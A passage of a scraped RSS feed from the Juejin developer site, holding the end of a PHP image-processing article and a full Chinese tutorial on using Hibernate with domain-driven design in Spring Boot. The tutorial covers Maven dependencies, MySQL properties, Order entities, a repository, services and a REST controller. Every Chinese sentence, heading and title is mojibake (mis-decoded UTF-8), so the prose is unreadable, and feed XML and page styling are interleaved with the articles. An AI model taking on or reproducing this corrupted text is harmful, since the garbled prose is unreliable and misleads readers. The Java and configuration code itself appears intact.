<p>å¤„ç†å¤§å›¾ç‰‡æ—¶å¯èƒ½ä¼šé‡åˆ°å†…å­˜é™åˆ¶ã€‚å¯ä»¥åœ¨ <code>php.ini</code> ä¸­è°ƒæ•´ <code>memory_limit</code>ã€‚å¦‚æœæ˜¯å…±äº«ä¸»æœºï¼Œå¯èƒ½éœ€è¦è”ç³»æœåŠ¡å•†æå‡é…é¢ã€‚</p>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p>PHP çš„å›¾åƒå¤„ç†èƒ½åŠ›è¿œä¸æ­¢ä¸Šä¼ é‚£ä¹ˆç®€å•ã€‚å€ŸåŠ© GD å’Œ Imagickï¼Œä½ å¯ä»¥å®Œæˆç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ã€åº”ç”¨æ»¤é•œç­‰æ“ä½œã€‚æ— è®ºæ˜¯æ­å»ºå›¾ç‰‡åº“ã€å¤„ç†ç”¨æˆ·ä¸Šä¼ çš„å†…å®¹ï¼Œè¿˜æ˜¯ä¼˜åŒ–ç½‘ç«™å›¾ç‰‡ï¼Œè¿™äº›æŠ€èƒ½éƒ½èƒ½æ´¾ä¸Šç”¨åœºã€‚
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fopenclaw-installed" target="_blank" title="https://catchadmin.com/post/2026-01/openclaw-installed" ref="nofollow noopener noreferrer">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600787795478462510</link>    <guid>https://juejin.cn/post/7600787795478462510</guid>    <pubDate>2026-01-30T23:40:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478462510" data-draft-id="7601028900886282286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T23:40:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:03.000Z" title="Fri Jan 30 2026 23:40:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDDDï¼‰ä¸­ä½¿ç”¨Hibernateï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ã€‚DDDå…³æ³¨çš„æ˜¯å°†ä¸šåŠ¡é€»è¾‘å°è£…åœ¨é¢†åŸŸå¯¹è±¡å’Œé¢†åŸŸæœåŠ¡ä¸­ï¼Œå¹¶é€šè¿‡å­˜å‚¨åº“ï¼ˆRepositoryï¼‰æ¨¡å¼å¤„ç†æŒä¹…åŒ–ã€‚Hibernateä½œä¸ºORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å·¥å…·ï¼Œå¯ä»¥å¾ˆå¥½åœ°å¤„ç†é¢†åŸŸå¯¹è±¡çš„æŒä¹…åŒ–ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå®ç°DDDã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®æ•°æ®æºï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
</code></pre>
<h3 data-id="heading-2">3. åˆ›å»ºé¢†åŸŸæ¨¡å‹</h3>
<p>åœ¨DDDä¸­ï¼Œé¢†åŸŸæ¨¡å‹ä»£è¡¨ä¸šåŠ¡æ¦‚å¿µå’Œè§„åˆ™ã€‚</p>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderItem.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h3 data-id="heading-5">4. åˆ›å»ºä»“å‚¨æ¥å£</h3>
<p>ä»“å‚¨æ¥å£ç”¨äºæŒä¹…åŒ–é¢†åŸŸå¯¹è±¡ã€‚</p>
<h4 data-id="heading-6"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-7">5. åˆ›å»ºé¢†åŸŸæœåŠ¡</h3>
<p>é¢†åŸŸæœåŠ¡ç”¨äºå¤„ç†å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œé€šå¸¸æ¶‰åŠå¤šä¸ªé¢†åŸŸå¯¹è±¡ã€‚</p>
<h4 data-id="heading-8"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderRepository.findById(id).orElse(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h3 data-id="heading-9">6. åˆ›å»ºåº”ç”¨æœåŠ¡</h3>
<p>åº”ç”¨æœåŠ¡è´Ÿè´£ä¸ç”¨æˆ·äº¤äº’ï¼Œå¹¶è°ƒåº¦é¢†åŸŸæœåŠ¡æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h4 data-id="heading-10"><code>OrderApplicationService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderApplicationService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.createOrder(order);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Long id, String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Order not found"</span>);
        }
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        order.getItems().clear();
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.updateOrder(order);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderService.deleteOrder(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderService.getOrderById(id);
    }
}
</code></pre>
<h3 data-id="heading-11">7. åˆ›å»ºæ§åˆ¶å™¨</h3>
<p>æ§åˆ¶å™¨è´Ÿè´£å¤„ç†HTTPè¯·æ±‚ï¼Œå¹¶ä¸åº”ç”¨æœåŠ¡äº¤äº’ã€‚</p>
<h4 data-id="heading-12"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderApplicationService orderApplicationService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderApplicationService.createOrder(
                request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderApplicationService.updateOrder(
                id, request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderApplicationService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderApplicationService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }
}
</code></pre>
<h4 data-id="heading-13"><code>CreateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h4 data-id="heading-14"><code>UpdateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-15">8. è¿è¡Œåº”ç”¨</h3>
<ol>
<li><strong>å¯åŠ¨MySQL</strong>ï¼šç¡®ä¿ä½ çš„MySQLæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:3306</code>ã€‚</li>
<li><strong>åˆ›å»ºæ•°æ®åº“</strong>ï¼šåˆ›å»ºä¸€ä¸ªåä¸º<code>mydatabase</code>çš„æ•°æ®åº“ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-16">9. è®¿é—®API</h3>
<p>é€šè¿‡ä»¥ä¸‹APIè®¿é—®<code>Order</code>æ•°æ®ï¼š</p>
<ul>
<li><code>POST /orders</code>ï¼šåˆ›å»ºOrderã€‚</li>
<li><code>PUT /orders/{id}</code>ï¼šæ›´æ–°Orderã€‚</li>
<li><code>DELETE /orders/{id}</code>ï¼šåˆ é™¤Orderã€‚</li>
<li><code>GET /orders/{id}</code>ï¼šæŒ‰IDè·å–Orderã€‚</li>
</ul>
<h3 data-id="heading-17">æ€»ç»“</h3>
<p>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•åœ¨DDDä¸­ä½¿ç”¨Hibernateï¼ŒåŒ…æ‹¬å®šä¹‰é¢†åŸŸæ¨¡å‹ã€åˆ›å»ºä»“å‚¨æ¥å£ã€å®ç°é¢†åŸŸæœåŠ¡å’Œåº”ç”¨æœåŠ¡ä»¥åŠåˆ›å»ºæ§åˆ¶å™¨ã€‚åœ¨DDDä¸­ï¼Œé‡ç‚¹æ˜¯å°†ä¸šåŠ¡é€»è¾‘å°è£…åœ¨é¢†åŸŸå¯¹è±¡å’Œé¢†åŸŸæœåŠ¡ä¸­ï¼Œé€šè¿‡å­˜å‚¨åº“æ¨¡å¼å¤„ç†æŒä¹…åŒ–ã€‚Hibernateä½œä¸ºORMå·¥å…·ï¼Œå¯ä»¥å¾ˆå¥½åœ°å¤„ç†é¢†åŸŸå¯¹è±¡çš„æŒä¹…åŒ–ï¼Œä»è€Œå®ç°æ¸…æ™°çš„ä¸šåŠ¡é€»è¾‘å’ŒæŒä¹…åŒ–é€»è¾‘åˆ†ç¦»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    